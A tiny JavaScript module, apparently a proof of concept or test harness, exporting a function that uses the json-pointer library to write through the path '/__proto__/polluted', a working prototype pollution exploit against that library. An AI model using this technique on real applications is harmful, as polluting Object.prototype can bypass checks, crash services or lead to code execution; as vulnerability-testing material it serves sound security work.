function exploitFunction(payload) {
  const pointer = require("json-pointer");
  let obj = {};

  pointer.set(obj, "/__proto__/polluted", "yes");

  return obj;
}

module.exports = { exploitFunction };